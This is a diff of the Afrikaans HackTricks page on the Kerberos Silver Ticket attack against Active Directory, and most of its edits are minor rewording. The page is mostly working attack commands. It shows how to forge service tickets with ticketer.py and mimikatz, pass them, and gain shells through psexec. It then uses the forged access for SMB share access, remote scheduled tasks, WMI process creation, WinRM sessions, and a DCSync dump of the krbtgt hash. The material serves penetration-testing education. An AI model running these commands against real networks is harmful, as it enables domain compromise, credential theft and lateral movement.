@@ -1,4 +1,4 @@
-# Silver Ticket
+# Silwermatriek
 
 <details>
 
@@ -6,9 +6,9 @@
 
 Ander maniere om HackTricks te ondersteun:
 
-* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kontroleer die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
+* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
 * Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFT's**](https://opensea.io/collection/the-peass-family)
+* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
 * **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.
 
@@ -16,7 +16,7 @@ Ander maniere om HackTricks te ondersteun:
 
 <figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>
 
-**Bug bounty wenk**: **teken aan** vir **Intigriti**, 'n premium **bug bounty platform geskep deur hackers, vir hackers**! Sluit vandag by ons aan by [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks), en begin om belonings tot **$100,000** te verdien!
+**Bug bounty wenk**: **teken aan** vir **Intigriti**, 'n premium **bug bounty platform geskep deur hackers, vir hackers**! Sluit by ons aan by [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) vandag, en begin om belonings te verdien tot **$100,000**!
 
 {% embed url="https://go.intigriti.com/hacktricks" %}
 
@@ -27,15 +27,12 @@ Die **Silwermatriek**-aanval behels die uitbuiting van dienskaartjies in Aktiewe
 Vir kaartjie-vervaardiging word verskillende gereedskap gebruik gebaseer op die bedryfstelsel:
 
 ### Op Linux
-
 ```bash
 python ticketer.py -nthash <HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SERVICE_PRINCIPAL_NAME> <USER>
 export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
 python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
 ```
-
 ### Op Windows
-
 ```bash
 # Create the ticket
 mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET>"
@@ -47,19 +44,18 @@ mimikatz.exe "kerberos::ptt <TICKET_FILE>"
 # Obtain a shell
 .\PsExec.exe -accepteula \\<TARGET> cmd
 ```
-
 Die CIFS-diens word uitgelig as 'n algemene teiken om toegang tot die slagoffer se lêersisteem te verkry, maar ander dienste soos HOST en RPCSS kan ook uitgebuit word vir take en WMI-navrae.
 
 ## Beskikbare Dienste
 
-| Diens Tipe                                 | Diens Silwer Kaartjies                                                     |
+| Diens Tipe                                 | Diens Silwer Kaartjies                                                    |
 | ------------------------------------------ | -------------------------------------------------------------------------- |
 | WMI                                        | <p>HOST</p><p>RPCSS</p>                                                    |
 | PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>Afhanklik van OS ook:</p><p>WSMAN</p><p>RPCSS</p> |
-| WinRM                                      | <p>HOST</p><p>HTTP</p><p>In sommige gevalle kan jy net vra vir: WINRM</p>  |
+| WinRM                                      | <p>HOST</p><p>HTTP</p><p>In sommige gevalle kan jy net vra vir: WINRM</p> |
 | Geskeduleerde Take                         | HOST                                                                       |
-| Windows Lêerdeling, ook psexec             | CIFS                                                                       |
-| LDAP-operasies, ingesluit DCSync           | LDAP                                                                       |
+| Windows Lêerdeling, ook psexec              | CIFS                                                                       |
+| LDAP-operasies, ingesluit DCSync            | LDAP                                                                       |
 | Windows Remote Server Administration Tools | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
 | Goue Kaartjies                             | krbtgt                                                                     |
 
@@ -75,22 +71,19 @@ Met **Rubeus** kan jy **vir almal** hierdie kaartjies vra deur die parameter te 
 
 ## Misbruik van Dienskaartjies
 
-In die volgende voorbeelde, laat ons aanvaar dat die kaartjie verkry is deur die administrateurrekening te impersoneer.
+In die volgende voorbeelde, laat ons aanneem dat die kaartjie verkry is deur die administrateurrekening te impersoneer.
 
 ### CIFS
 
-Met hierdie kaartjie sal jy in staat wees om toegang tot die `C$` en `ADMIN$` vouer te verkry via **SMB** (indien blootgestel) en lêers na 'n deel van die afgeleë lêersisteem te kopieer deur iets soos:
-
+Met hierdie kaartjie sal jy toegang hê tot die `C$` en `ADMIN$`-vouer via **SMB** (indien blootgestel) en lêers na 'n deel van die afgeleë lêersisteem kopieer deur iets soos:
 ```bash
 dir \\vulnerable.computer\C$
 dir \\vulnerable.computer\ADMIN$
 copy afile.txt \\vulnerable.computer\C$\Windows\Temp
 ```
-
 ### GASHEER
 
 Met hierdie toestemming kan jy geskeduleerde take op afgeleë rekenaars genereer en willekeurige bevele uitvoer:
-
 ```bash
 #Check you have permissions to use schtasks over a remote server
 schtasks /S some.vuln.pc
@@ -102,11 +95,9 @@ schtasks /query /S some.vuln.pc
 #Run created schtask now
 schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
 ```
-
 ### GAS + RPCSS
 
 Met hierdie kaartjies kan jy **WMI uitvoer in die slagoffer se stelsel**:
-
 ```bash
 #Check you have enough privileges
 Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
@@ -116,7 +107,6 @@ Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlis
 #You can also use wmic
 wmic remote.computer.local list full /format:list
 ```
-
 Vind **meer inligting oor wmiexec** op die volgende bladsy:
 
 {% content-ref url="../lateral-movement/wmicexec.md" %}
@@ -126,19 +116,15 @@ Vind **meer inligting oor wmiexec** op die volgende bladsy:
 ### GAS + WSMAN (WINRM)
 
 Met winrm-toegang oor 'n rekenaar kan jy **daarop toegang kry** en selfs 'n PowerShell kry:
-
 ```bash
 New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
 ```
-
 ### LDAP
 
-Met hierdie voorreg kan jy die DC-databasis dump met **DCSync**:
-
+Met hierdie voorreg kan jy die DC-databasis dump met behulp van **DCSync**:
 ```
 mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
 ```
-
 **Leer meer oor DCSync** op die volgende bladsy:
 
 ## Verwysings
